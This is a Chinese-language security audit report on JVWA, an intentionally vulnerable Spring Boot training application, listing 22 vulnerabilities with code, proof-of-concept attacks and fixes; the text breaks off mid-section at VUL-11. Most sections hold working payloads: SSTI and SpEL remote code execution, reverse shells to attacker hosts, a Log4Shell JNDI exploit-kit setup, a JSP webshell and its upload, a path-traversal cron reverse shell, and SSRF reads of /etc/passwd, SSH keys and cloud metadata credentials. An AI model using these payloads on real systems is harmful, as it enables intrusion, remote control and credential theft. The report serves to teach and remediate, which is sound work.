# JVWA 安全代码审计报告

| 项目 | 详情 |
|------|------|
| 应用名称 | Java Vulnerable Web Application（JVWA） |
| 技术栈 | Spring Boot 2.1.3 / MyBatis / Thymeleaf / Log4j2 |
| 审计范围 | `src/main/java/com/ffffffff0x/exploit/` |
| 报告日期 | 2026-02-26 |
| 漏洞总数 | 22 |

---

## 漏洞汇总

| 编号 | 漏洞类型 | 危险等级 | 文件位置 |
|------|----------|----------|----------|
| VUL-01 | SQL 注入（MyBatis `${}`） | 🔴 严重 | SQLinj.java / UserMapper.xml |
| VUL-02 | SSTI（Thymeleaf 预处理表达式） | 🔴 严重 | SSTI.java / ssti.html |
| VUL-03 | SSTI（视图名称可控） | 🔴 严重 | SSTI.java |
| VUL-04 | SpEL 注入（StandardEvaluationContext） | 🔴 严重 | SpEL.java |
| VUL-20 | Log4Shell（CVE-2021-44228） | 🔴 严重 | pom.xml / 全局 log 调用 |
| VUL-05 | SSRF（无过滤，任意协议） | 🟠 高危 | SSRF.java / Http.java |
| VUL-06 | SSRF（HTTP 重定向绕过） | 🟠 高危 | SSRF.java / Http.java |
| VUL-21 | SSRF 内网检测正则绕过 | 🟠 高危 | Security.java |
| VUL-07 | 任意文件上传（无过滤） | 🟠 高危 | Upload.java |
| VUL-08 | 文件上传黑名单绕过 | 🟠 高危 | Upload.java |
| VUL-09 | 文件上传路径穿越 | 🟠 高危 | Upload.java |
| VUL-10 | 开放重定向（无过滤） | 🟡 中危 | Redirect.java |
| VUL-11 | 开放重定向（contains 检测绕过） | 🟡 中危 | Redirect.java |
| VUL-12 | 开放重定向（反斜杠绕过） | 🟡 中危 | Redirect.java |
| VUL-22 | SpEL 结果作视图名触发链式 SSTI | 🟡 中危 | SpEL.java |
| VUL-13 | SQL 过滤函数（checkSql）完全失效 | 🟡 中危 | Security.java |
| VUL-14 | Spring Actuator 全端点暴露 | 🟡 中危 | application-dev.properties |
| VUL-15 | Druid 控制台弱口令且无访问限制 | 🟡 中危 | application-dev.properties |
| VUL-16 | 数据库凭据硬编码 | 🟡 中危 | application-dev.properties |
| VUL-17 | 云凭据（AK/SK）信息泄露 | 🟡 中危 | InfoLeak.java / aksk.html |
| VUL-18 | IP 伪造（信任可控请求头） | 🔵 低危 | IPInfo.java |
| VUL-19 | Swagger UI XSS | 🔵 低危 | application-dev.properties |

---

## 详细分析

---

### VUL-01：SQL 注入（MyBatis `${}` 字符串拼接）

**危险等级**：🔴 严重

#### 漏洞描述

MyBatis 提供两种参数引用方式：`#{}` 为预编译参数占位符（安全），`${}` 为字符串直接拼接（不安全）。项目中 `findById` 查询使用 `${id}` 将用户输入直接嵌入 SQL 语句，导致经典 SQL 注入。该漏洞同时存在于 MySQL 和 PostgreSQL 数据源，共 4 处。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/p/mapper/UserMapperPrimary.java:19`
- `src/main/java/com/ffffffff0x/exploit/s/mapper/UserMapperSecondary.java:17`
- `src/main/resources/mapper.primary/UserMapper.xml:13`
- `src/main/resources/mapper.secondary/UserMapper.xml:13`
- `src/main/java/com/ffffffff0x/exploit/SQLinj.java:31-43`

#### 漏洞代码

```java
// UserMapperPrimary.java:19
@Select("select * from user_info where id = ${id}")  // ${} 直接拼接，危险
List<UserPrimary> findById(@Param("id") String id);
```

```xml
<!-- mapper.primary/UserMapper.xml:13 -->
<select id="findById" resultType="com.ffffffff0x.exploit.p.entity.UserPrimary">
    select * from USER where id = ${id}
</select>
```

```java
// SQLinj.java:31-35 - Path Variable 直接传入，无任何过滤
@GetMapping("/mysql/getbyid/{id}")
public List<UserPrimary> getById(@PathVariable String id) {
    log.info("输入的查询payload: " + id);
    return userMapperPrimary.findById(id);
}
```

#### 漏洞利用 PoC

**基础注入 - 万能查询：**
```
GET /sqlinj/mysql/getbyid/1 or 1=1
```

**布尔盲注：**
```
GET /sqlinj/mysql/getbyid/1 and 1=1   → 返回数据（条件真）
GET /sqlinj/mysql/getbyid/1 and 1=2   → 无数据（条件假）
```

**时间盲注 - 判断当前用户：**
```
GET /sqlinj/mysql/getbyid/1 and (select if(mid(user(),1,4)='root',sleep(3),0))
```

**时间盲注 - 带注释绕过：**
```
GET /sqlinj/mysql/getbyidp/id?id=1%20and%20(select%20/**/if(%27root%27=%27root%27,/**/sleep(5),123))
```

**PostgreSQL 注入：**
```
GET /sqlinj/postgre/getbyid/1;select pg_sleep(3)--
```

**使用 sqlmap 自动化：**
```bash
sqlmap -u "http://127.0.0.1:8999/sqlinj/mysql/getbyid/1" --dbms=mysql --dbs
sqlmap -u "http://127.0.0.1:8999/sqlinj/mysql/getbyidp/id?id=1" --dbms=mysql --dbs
```

#### 修复方案

将所有 `${}` 改为 `#{}`，使用预编译参数：

```java
// 修复后
@Select("select * from user_info where id = #{id}")
List<UserPrimary> findById(@Param("id") String id);
```

```xml
<!-- 修复后 -->
<select id="findById" resultType="...">
    select * from USER where id = #{id}
</select>
```

---

### VUL-02：SSTI - Thymeleaf 预处理表达式注入（RCE）

**危险等级**：🔴 严重

#### 漏洞描述

Thymeleaf 模板引擎支持预处理语法 `__${expression}__`，该语法会在正常求值之前对内层表达式再额外解析一次。当此语法用于 `th:href` 等属性且内层变量来自用户输入时，攻击者可注入 SpEL 表达式，由 Thymeleaf 在服务端执行，最终实现远程代码执行。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/SSTI.java:30-35`
- `src/main/resources/templates/ssti.html:4`

#### 漏洞代码

```java
// SSTI.java:30-35
@GetMapping("/1")
public String vul(@RequestParam(name="name") String name,
                  @RequestParam(name="name2") String name2,
                  Model model) {
    model.addAttribute("name", name);    // 用户输入写入 Model
    model.addAttribute("name2", name2);
    return "ssti";
}
```

```html
<!-- ssti.html:4 - 双下划线预处理语法，name 的值会被当作 SpEL 表达式二次求值 -->
<h1 th:href="@{__${name}__}">name1参数</h1>
<h1 th:text="${name2}">name2参数</h1>   <!-- name2 安全，th:text 不触发预处理 -->
```

#### 漏洞利用 PoC

**执行系统命令（弹出计算器）：**
```
GET /ssti/1?name=${T(java.lang.Runtime).getRuntime().exec('open+-a+Calculator')}&name2=1
```

**读取 `/etc/passwd`：**
```
GET /ssti/1?name=${T(java.util.Scanner).new(T(java.lang.Runtime).getRuntime().exec(new+String[]{'/bin/sh','-c','cat+/etc/passwd'}).getInputStream()).useDelimiter('\\A').next()}&name2=1
```

**URL 编码后的完整 PoC：**
```
GET /ssti/1?name=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D&name2=1
```

注意：`name2` 使用 `th:text="${name2}"` 不触发预处理，是安全写法。

#### 修复方案

避免在属性中使用 `__${变量}__` 预处理语法；用安全的 `th:text` 或 `th:utext`：

```html
<!-- 修复后：移除预处理语法 -->
<h1 th:text="${name}">name1参数</h1>
<h1 th:text="${name2}">name2参数</h1>
```

---

### VUL-03：SSTI - 视图名称（View Name）可控（RCE）

**危险等级**：🔴 严重

#### 漏洞描述

Spring MVC 控制器返回的字符串由 ViewResolver 解析为模板路径。当返回值由用户输入拼接而成时，攻击者可通过注入 Thymeleaf 预处理表达式 `__${...}__::.x` 使模板引擎在解析"文件名"时执行任意 SpEL 代码。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/SSTI.java:40-43`

#### 漏洞代码

```java
// SSTI.java:40-43
@GetMapping("/2")
public String path(@RequestParam String name) {
    // 用户完全控制返回的视图路径
    return "user/" + name + "/welcome";
}
```

#### 漏洞利用 PoC

**执行 `id` 命令并回显（经典 Thymeleaf 视图名注入 payload）：**
```
GET /ssti/2?name=__$%7bnew+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()%7d__::.x
```

解码后 payload：
```
name=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

最终视图名为：
```
user/__${...}__::.x/welcome
```

Thymeleaf 解析 `__${...}__` 时执行 SpEL，`::.x` 是 Thymeleaf 片段选择器，用于触发解析路径。

**反弹 Shell：**
```
GET /ssti/2?name=__$%7bT(java.lang.Runtime).getRuntime().exec(new+String[]{"/bin/bash","-c","bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261"})%7d__::.x
```

#### 修复方案

对 `name` 参数使用白名单校验，只允许已知安全的目录名：

```java
// 修复后
private static final Set<String> ALLOWED_USERS = Set.of("zhang3", "li4");

@GetMapping("/2")
public String path(@RequestParam String name) {
    if (!ALLOWED_USERS.contains(name)) {
        return "error";
    }
    return "user/" + name + "/welcome";
}
```

---

### VUL-04：SpEL 注入（StandardEvaluationContext，RCE）

**危险等级**：🔴 严重

#### 漏洞描述

Spring Expression Language（SpEL）在 `StandardEvaluationContext` 上下文下拥有对 JVM 全部类和方法的访问权限，支持 `T()` 运算符加载任意类。项目直接将用户输入传入 SpEL 解析器，攻击者可执行任意 Java 代码。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/SpEL.java:27-47`

#### 漏洞代码

```java
// SpEL.java:27-47
@GetMapping("/spel")
public String vul1(String exec) {
    ExpressionParser parser = new SpelExpressionParser();
    // StandardEvaluationContext 权限过大，可访问所有 Java 类
    EvaluationContext evaluationContext = new StandardEvaluationContext();

    // exec 参数未经任何过滤直接传入解析器
    String result = parser.parseExpression(exec)
                          .getValue(evaluationContext)
                          .toString();
    log.info(exec);
    return result;
}
```

#### 漏洞利用 PoC

**执行系统命令 `id`：**
```
GET /spel?exec=T(java.lang.Runtime).getRuntime().exec("id")
```

**执行命令并获取输出：**
```
GET /spel?exec=new+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()
```

**写入 WebShell（假设 /tmp 可访问）：**
```
GET /spel?exec=T(java.nio.file.Files).write(T(java.nio.file.Paths).get("/tmp/shell.jsp"),T(java.util.Base64).getDecoder().decode("PCVAcGFnZSBpbXBvcnQ9ImphdmEuaW8uKiIlPjwlUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOyU+"))
```

**使用 ProcessBuilder 执行（更通用）：**
```
GET /spel?exec=new+java.lang.ProcessBuilder(new+String[]{"/bin/bash","-c","whoami"}).start().toString()
```

#### 修复方案

使用 `SimpleEvaluationContext` 替换 `StandardEvaluationContext`，前者不允许调用任意类：

```java
// 修复后：使用受限上下文
EvaluationContext evaluationContext = SimpleEvaluationContext
    .forReadOnlyDataBinding()
    .build();

// 或者直接禁止用户输入 SpEL，改为固定表达式白名单
```

---

### VUL-20：Log4Shell（CVE-2021-44228）日志注入 RCE

**危险等级**：🔴 严重

#### 漏洞描述

Log4j2（2.0-beta9 至 2.14.1）在处理日志消息时会对 `${...}` 表达式执行 Lookup 解析，支持 `${jndi:ldap://...}` 等协议。项目使用 Spring Boot 2.1.3 内置的 Log4j2 2.11.x（属于受影响版本），且多个端点将用户输入直接传入 `log.info()`，攻击者无需认证即可触发 JNDI 请求，加载远程 Java 类实现 RCE。项目代码注释中已明确标注了此漏洞的 JNDI payload。

#### 漏洞位置

- `pom.xml:33`：引入 `spring-boot-starter-log4j2`
- `src/main/java/com/ffffffff0x/exploit/Redirect.java:24`：`log.info(url)`
- `src/main/java/com/ffffffff0x/exploit/SSRF.java:29`：`log.info("访问路径：" + url)`
- `src/main/java/com/ffffffff0x/exploit/SQLinj.java:33`：`log.info("输入的查询payload: " + id)`
- `src/main/java/com/ffffffff0x/exploit/SpEL.java:40`：`log.info(exec)`
- `src/main/java/com/ffffffff0x/exploit/Upload.java:63,92`：`log.info("后缀名: " + suffix)`

#### 漏洞代码

```xml
<!-- pom.xml:33 - 引入存在漏洞的 Log4j2 -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>
```

```java
// Redirect.java:23-25 - 注释中已标注 JNDI 攻击向量
// http://127.0.0.1:8999/redirect/1?url=${jndi:ldap://attacker.com/exp}
@GetMapping("/1")
public String vul(String url) {
    log.info(url);  // ← 用户输入的 ${jndi:...} 被 Log4j2 解析并发起 JNDI 请求
    return "redirect:" + url;
}

// SpEL.java:40
// http://127.0.0.1:8999/spel?exec=${jndi:ldap://attacker.com/exp}
log.info(exec);  // ← 同样触发
```

#### 漏洞利用 PoC

**第一步：启动 JNDI 恶意服务（攻击机）：**
```bash
# 使用 marshalsec 或 JNDI-Exploit-Kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
java -jar JNDI-Exploit-Kit.jar -C "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
# 监听端口
nc -lvnp 4444
```

**第二步：触发受影响端点（任意一个即可）：**
```bash
# 通过 Redirect 端点触发
curl "http://127.0.0.1:8999/redirect/1?url=\${jndi:ldap://192.168.1.100:1389/exp}"

# 通过 SSRF 端点触发
curl "http://127.0.0.1:8999/ssrf/1?url=\${jndi:ldap://192.168.1.100:1389/exp}"

# 通过 SQL 注入端点触发（路径参数）
curl "http://127.0.0.1:8999/sqlinj/mysql/getbyid/\${jndi:ldap://192.168.1.100:1389/exp}"

# 通过 SpEL 端点触发
curl "http://127.0.0.1:8999/spel?exec=\${jndi:ldap://192.168.1.100:1389/exp}"
```

**绕过过滤的变体 payload（代码注释中已有）：**
```
# 嵌套变量绕过关键词过滤
${jndi:ldap://${sys:os.name}.attacker.com/exp}
${${lower:j}ndi:${lower:l}dap://attacker.com/exp}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/exp}
```

#### 修复方案

**方案一（推荐）**：升级 Spring Boot 至 2.5.8+ 或 2.6.2+（内置 Log4j2 2.17.1+）：
```xml
<!-- pom.xml -->
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.7.18</version>
</parent>
```

**方案二**：在 pom.xml 中强制指定安全版本：
```xml
<properties>
    <log4j2.version>2.17.1</log4j2.version>
</properties>
```

**方案三（临时缓解）**：JVM 启动参数：
```
-Dlog4j2.formatMsgNoLookups=true
```

---

### VUL-05：SSRF - 无过滤（支持任意协议）

**危险等级**：🟠 高危

#### 漏洞描述

`/ssrf/1` 端点将用户提供的 URL 直接传入 `URLConnection`，不进行任何协议或地址过滤。`URLConnection` 支持 `http://`、`https://`、`file://`、`jar://`、`ftp://` 等多种协议，攻击者可利用 `file://` 读取服务器本地文件，或探测内网服务。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/SSRF.java:28-32`
- `src/main/java/com/ffffffff0x/exploit/util/Http.java:39-58`

#### 漏洞代码

```java
// SSRF.java:28-32
@GetMapping("/1")
public String vul1(String url) {
    log.info("访问路径：" + url);
    return Http.URLConnection(url);  // 无任何过滤，直接发起请求
}

// Http.java:39-58
public static String URLConnection(String url) {
    URL u = new URL(url);
    URLConnection conn = u.openConnection();  // 支持 file://, jar://, ftp:// 等
    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
    // ...读取并返回内容
}
```

#### 漏洞利用 PoC

**读取本地文件：**
```bash
# 读取 /etc/passwd
curl "http://127.0.0.1:8999/ssrf/1?url=file:///etc/passwd"

# 读取应用配置文件（含数据库密码）
curl "http://127.0.0.1:8999/ssrf/1?url=file:///app/resources/application-dev.properties"

# 读取 SSH 私钥
curl "http://127.0.0.1:8999/ssrf/1?url=file:///root/.ssh/id_rsa"
```

**探测内网服务：**
```bash
# 探测内网 MySQL
curl "http://127.0.0.1:8999/ssrf/1?url=http://10.211.55.3:3306"

# 访问云元数据服务（AWS）
curl "http://127.0.0.1:8999/ssrf/1?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**jar 协议利用：**
```bash
curl "http://127.0.0.1:8999/ssrf/1?url=jar:http://evil.com/malicious.jar!/"
```

#### 修复方案

```java
// 修复后：协议白名单 + 内网 IP 黑名单 + 禁止重定向
@GetMapping("/safe")
public String safe(String url) {
    if (!Security.isHttp(url)) {
        return "不允许非 http/https 协议";
    }
    if (Security.isIntranet(url)) {
        return "不允许访问内网";
    }
    return Http.HTTPURLConnection(url);  // HTTPURLConnection 设置了不跟随重定向
}
```

---

### VUL-06：SSRF - HTTP 重定向绕过内网检测

**危险等级**：🟠 高危

#### 漏洞描述

`/ssrf/2` 实现了 URL 协议检测和内网 IP 检测，但使用 `URLConnection2` 发起请求，该方法会手动跟随 HTTP 重定向，且**重定向后的目标地址不经过任何安全检查**。攻击者可借助 URL 短链或自建重定向服务，将外网 URL 重定向至内网地址或 `file://` 协议，绕过安全检测。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/SSRF.java:39-69`
- `src/main/java/com/ffffffff0x/exploit/util/Http.java:61-99`

#### 漏洞代码

```java
// SSRF.java:39-69 - 检查时是外网 IP，实际请求跟随重定向到内网
@GetMapping("/2")
public String vul2(String url) {
    URL url2 = new URL(url);
    String host = url2.getHost();
    InetAddress ip = InetAddress.getByName(host);  // DNS 解析
    String ip3 = ip.toString().substring(ip.toString().lastIndexOf("/") + 1);

    if (!Security.isHttp(url)) { return "不允许非 http/https 协议"; }
    else if (Security.isIntranet(url)) { return "不允许访问内网"; }
    else if (Security.isIntranet(ip3)) { return "不允许访问内网"; }
    else {
        return Http.URLConnection2(url);  // ← 跟随重定向，但不重新检查目标地址
    }
}

// Http.java:79-84 - 获取重定向地址后直接请求，无安全检查
if (redirect) {
    String newUrl = connection.getHeaderField("Location");
    URL u1 = new URL(newUrl);           // newUrl 可以是 file:// 或内网地址
    conn = u1.openConnection();          // 直接发起请求
}
```

#### 漏洞利用 PoC

**方法一：URL 短链重定向绕过（最简单）：**
```bash
# 1. 在短链服务上创建重定向：https://short.link/xxx → file:///etc/passwd
# 2. 触发
curl "http://127.0.0.1:8999/ssrf/2?url=https://short.link/xxx"
```

**方法二：自建重定向服务器：**
```python
# attacker_redirect.py
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'file:///etc/passwd')  # 或内网地址
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
```
```bash
curl "http://127.0.0.1:8999/ssrf/2?url=http://attacker.com:8080/"
```

**方法三：DNS Rebinding（先解析外网 IP，请求时换成内网 IP）：**
使用 [rebind.it](https://lock.cmpxchg8b.com/rebinder.html) 或自建 DNS 服务，第一次 TTL=0 解析返回外网 IP，第二次解析返回 `127.0.0.1`。

#### 修复方案

禁止跟随 HTTP 重定向，使用 `HTTPURLConnection` 并设置 `setInstanceFollowRedirects(false)`：

```java
// 安全的做法（参考 Http.HTTPURLConnection）
HttpURLConnection conn = (HttpURLConnection) u.openConnection();
conn.setInstanceFollowRedirects(false);  // 禁止自动重定向
// 若要支持重定向，需在重定向后重新执行安全检查
```

---

### VUL-21：SSRF 内网检测正则绕过

**危险等级**：🟠 高危

#### 漏洞描述

`Security.isIntranet()` 使用正则表达式检测内网地址，但存在以下缺陷：正则锚点分组错误（`^` 仅约束第一个分支），且完全未覆盖 IPv6、链路本地地址（169.254.x.x）、IPv4 的多种非标准表示法（十六进制、八进制、十进制整数）。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/util/Security.java:19-24`

#### 漏洞代码

```java
// Security.java:19-24
public static boolean isIntranet(String url) {
    // 问题1: ^ 只约束第一个分支，$ 只约束最后一个分支
    // 问题2: 未覆盖 IPv6、169.254.x.x 等地址
    Pattern reg = Pattern.compile(
        "^(127\\.0\\.0\\.1)|(localhost)" +
        "|(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})" +
        "|(172\\.((1[6-9])|(2\\d)|(3[01]))\\.\\d{1,3}\\.\\d{1,3})" +
        "|(192\\.168\\.\\d{1,3}\\.\\d{1,3})$"
    );
    Matcher match = reg.matcher(url);
    return match.find();
}
```

#### 漏洞利用 PoC

**绕过方式一：云元数据服务（最危险，169.254.x.x 完全未覆盖）：**
```bash
# AWS 实例元数据 - 获取 IAM 凭据
curl "http://127.0.0.1:8999/ssrf/2?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# 阿里云元数据
curl "http://127.0.0.1:8999/ssrf/2?url=http://100.100.100.200/latest/meta-data/"
```

**绕过方式二：IPv6 回环地址：**
```bash
curl "http://127.0.0.1:8999/ssrf/2?url=http://[::1]:8080/admin"
curl "http://127.0.0.1:8999/ssrf/2?url=http://[::ffff:127.0.0.1]/admin"
```

**绕过方式三：IPv4 特殊表示：**
```bash
# 十六进制（127.0.0.1 的十六进制）
curl "http://127.0.0.1:8999/ssrf/2?url=http://0x7f.0.0.1/"

# 八进制
curl "http://127.0.0.1:8999/ssrf/2?url=http://0177.0.0.1/"

# 十进制整数（127*256^3 + 0*256^2 + 0*256 + 1 = 2130706433）
curl "http://127.0.0.1:8999/ssrf/2?url=http://2130706433/"

# 混合格式
curl "http://127.0.0.1:8999/ssrf/2?url=http://127.1/"
```

**绕过方式四：`0.0.0.0`（部分系统等价于回环）：**
```bash
curl "http://127.0.0.1:8999/ssrf/2?url=http://0.0.0.0/"
```

#### 修复方案

将 IP 转为 `InetAddress` 后进行精确范围比较，避免依赖字符串正则：

```java
public static boolean isIntranet(String ip) {
    try {
        InetAddress addr = InetAddress.getByName(ip);
        // 使用 Java 内置方法检测特殊地址
        return addr.isLoopbackAddress()    // 127.x.x.x / ::1
            || addr.isSiteLocalAddress()   // 10.x / 172.16-31.x / 192.168.x
            || addr.isLinkLocalAddress()   // 169.254.x.x
            || addr.isAnyLocalAddress();   // 0.0.0.0
    } catch (UnknownHostException e) {
        return true; // 解析失败视为危险
    }
}
```

---

### VUL-07：任意文件上传（无过滤）

**危险等级**：🟠 高危

#### 漏洞描述

`/upload` 端点对上传文件不进行任何校验，直接使用客户端提供的原始文件名保存到磁盘，攻击者可上传 JSP WebShell 直接获取服务器控制权。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/Upload.java:34-48`

#### 漏洞代码

```java
// Upload.java:34-48
@PostMapping("/upload")
@ResponseBody
public String vul1(@RequestPart MultipartFile file) throws IOException {
    String fileName = file.getOriginalFilename();  // 完全信任客户端提供的文件名
    String filePath = path + fileName;             // path = "/tmp/"

    // 无类型检查、无大小限制、无路径校验
    File dest = new File(filePath);
    Files.copy(file.getInputStream(), dest.toPath());
    return "文件上传成功 : " + dest.getAbsolutePath();
}
```

#### 漏洞利用 PoC

**上传 JSP WebShell：**
```bash
# 准备 WebShell 内容
cat > webshell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line = br.readLine()) != null) sb.append(line).append("\n");
    out.println(sb.toString());
%>
EOF

# 上传 WebShell
curl -X POST http://127.0.0.1:8999/upload \
     -F "file=@webshell.jsp;type=image/jpeg"

# 利用 WebShell 执行命令（若 /tmp 为 Web 可访问目录）
curl "http://127.0.0.1:8999/tmp/webshell.jsp?cmd=id"
```

#### 修复方案

```java
// 修复后：扩展名白名单 + 随机文件名 + 路径规范化
@PostMapping("/upload")
@ResponseBody
public String safe(@RequestPart MultipartFile file) throws IOException {
    String originalName = file.getOriginalFilename();
    // 仅取文件名，去除路径前缀
    String safeFileName = Paths.get(originalName).getFileName().toString();
    String suffix = safeFileName.substring(safeFileName.lastIndexOf(".")).toLowerCase();

    Set<String> allowedSuffixes = Set.of(".jpg", ".jpeg", ".png", ".gif", ".pdf");
    if (!allowedSuffixes.contains(suffix)) {
        return "非法文件类型";
    }
    // 随机化文件名
    String newName = UUID.randomUUID() + suffix;
    Files.copy(file.getInputStream(), Paths.get(uploadDir, newName));
    return "上传成功";
}
```

---

### VUL-08：文件上传黑名单绕过

**危险等级**：🟠 高危

#### 漏洞描述

`/upload2` 使用黑名单方式过滤 `.jsp` 和 `.jspx` 两种扩展名，但 JSP 文件可以使用多种其他扩展名被 Tomcat 等服务器解析执行，导致黑名单被轻易绕过。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/Upload.java:51-80`

#### 漏洞代码

```java
// Upload.java:51-80
@PostMapping("/upload2")
@ResponseBody
public String vul2(@RequestPart MultipartFile file) throws IOException {
    // 黑名单仅拦截两种扩展名，远远不够
    List<String> suffixlist = List.of(".jsp", ".jspx");

    String suffix = fileName.substring(fileName.lastIndexOf("."));
    String suffixLower = suffix.toLowerCase();

    if (suffixlist.contains(suffixLower)) {
        return "非法请求，请上传文档文件";
    } else {
        // 其他扩展名均放行，包括 .jspf .jspa .jspx(大写) 等
        Files.copy(file.getInputStream(), dest.toPath());
        return "文件上传成功";
    }
}
```

#### 漏洞利用 PoC

**使用 JSP 变体扩展名绕过：**
```bash
# .jspf - JSP Fragment（Tomcat 默认支持）
curl -X POST http://127.0.0.1:8999/upload2 -F "file=@webshell.jspf"

# .jspa - Apache Sling JSP（某些配置下有效）
curl -X POST http://127.0.0.1:8999/upload2 -F "file=@webshell.jspa"

# 大小写绕过（代码虽用了 toLowerCase，但 List.of(".jsp",".jspx") 本身没有其他变体）
curl -X POST http://127.0.0.1:8999/upload2 -F "file=@webshell.JSP"

# 在某些中间件配置下，通过 Content-Type 欺骗
curl -X POST http://127.0.0.1:8999/upload2 \
     -F "file=@webshell.jspf;type=image/png"
```

#### 修复方案

改用白名单替代黑名单，只允许已知安全类型：

```java
// 修复后：白名单
Set<String> allowedSuffixes = Set.of(".jpg", ".jpeg", ".png", ".gif", ".xlsx", ".xls", ".pdf");
if (!allowedSuffixes.contains(suffixLower)) {
    return "非法文件类型，请上传允许的格式";
}
```

---

### VUL-09：文件上传路径穿越

**危险等级**：🟠 高危

#### 漏洞描述

`/upload3` 虽然实现了扩展名白名单（`.xlsx`/`.xls`），但对 `getOriginalFilename()` 返回的文件名未做路径穿越校验。文件名中包含 `../` 序列时，`new File(path + fileName)` 会解析到上传目录之外的任意路径，攻击者可将文件写入系统敏感目录（如 `/etc/cron.d/`）。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/Upload.java:84-108`

#### 漏洞代码

```java
// Upload.java:84-108
@PostMapping("/upload3")
@ResponseBody
public String vul3(@RequestPart MultipartFile file) throws IOException {
    String fileName = file.getOriginalFilename();   // 可含 ../
    String filePath = path + fileName;              // path="/tmp/", 拼接后路径可穿越

    String suffix = fileName.substring(fileName.lastIndexOf("."));
    if (!".xlsx".equals(suffix) && !".xls".equals(suffix)) {
        return "非法请求，请上传excel文件";
    }
    // 通过了扩展名检查，但路径未做规范化
    File dest = new File(filePath);
    Files.copy(file.getInputStream(), dest.toPath());
    return "文件上传成功 : " + dest.getAbsolutePath();
}
```

#### 漏洞利用 PoC

**写入定时任务（反弹 Shell）：**

Linux `/etc/cron.d/` 目录下的文件可以使用任意扩展名，且会被 cron 守护进程读取执行。

```bash
# 文件名：../../etc/cron.d/reverse.xls
# 文件内容：crontab 任务
cat > payload.xls << 'EOF'
* * * * * root bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
EOF

curl -X POST http://127.0.0.1:8999/upload3 \
     -F "file=@payload.xls;filename=../../etc/cron.d/reverse.xls"

# 监听反弹 Shell
nc -lvnp 4444
```

**写入 SSH authorized_keys：**
```bash
echo "ssh-rsa AAAA...attacker_pubkey..." > authorized.xls

curl -X POST http://127.0.0.1:8999/upload3 \
     -F "file=@authorized.xls;filename=../../../root/.ssh/authorized_keys"
```

#### 修复方案

使用 `Paths.get().getFileName()` 去除路径前缀，并验证最终路径在上传目录内：

```java
// 修复后
String originalName = file.getOriginalFilename();
String safeFileName = Paths.get(originalName).getFileName().toString(); // 去除路径部分
Path uploadPath = Paths.get(uploadDir).toRealPath();
Path destPath = uploadPath.resolve(safeFileName).normalize();

// 确保目标路径在上传目录内
if (!destPath.startsWith(uploadPath)) {
    return "非法路径";
}
Files.copy(file.getInputStream(), destPath);
```

---

### VUL-10：开放重定向（无过滤）

**危险等级**：🟡 中危

#### 漏洞描述

`/redirect/1` 将 `url` 参数直接拼接到 Spring MVC 的 `redirect:` 前缀，不进行任何目标地址校验，可跳转至任意外部 URL，常用于钓鱼攻击和绕过 OAuth 回调校验。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/Redirect.java:23-26`

#### 漏洞代码

```java
// Redirect.java:23-26
@GetMapping("/1")
public String vul(String url) {
    log.info(url);
    return "redirect:" + url;  // url 完全由用户控制
}
```

#### 漏洞利用 PoC

**钓鱼攻击：**
```
# 伪装为可信站点的链接，实际跳转至钓鱼页面
http://127.0.0.1:8999/redirect/1?url=https://evil-phishing.com/login
```

**结合 Log4Shell（同时触发两个漏洞）：**
```bash
# JNDI payload 既触发重定向，又因 log.info(url) 触发 Log4Shell
curl "http://127.0.0.1:8999/redirect/1?url=\${jndi:ldap://attacker.com/exp}"
```

#### 修复方案

```java
// 修复后：使用严格的域名白名单，并用 URL 类解析 host
@GetMapping("/1")
public String safe(String url) {
    Set<String> allowedHosts = Set.of("home.ffffffff0x.com", "www.ffffffff0x.com");
    try {
        url = url.replaceAll("[\\\\#]", "/");
        String host = new URL(url).getHost();
        if (allowedHosts.contains(host.toLowerCase())) {
            return "redirect:" + url;
        }
    } catch (MalformedURLException ignored) {}
    return "redirect:/error";
}
```

---

### VUL-11：开放重定向（`indexOf` 包含检测绕过）

**危险等级**：🟡 中危

#### 漏洞描述

`/redirect/2` 使用 `url.indexOf(domain)` 检查 URL 中是否包含 `ffffffff0x.com`，但这种字符串包含检测可以被绕过：只要目标字符串出现在 URL 的任意位置（如路径、参数），即视为合法。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/Redirect.java:31-41`

#### 漏洞代码

```java
// Redirect.java:31-41
@GetMapping("/2")
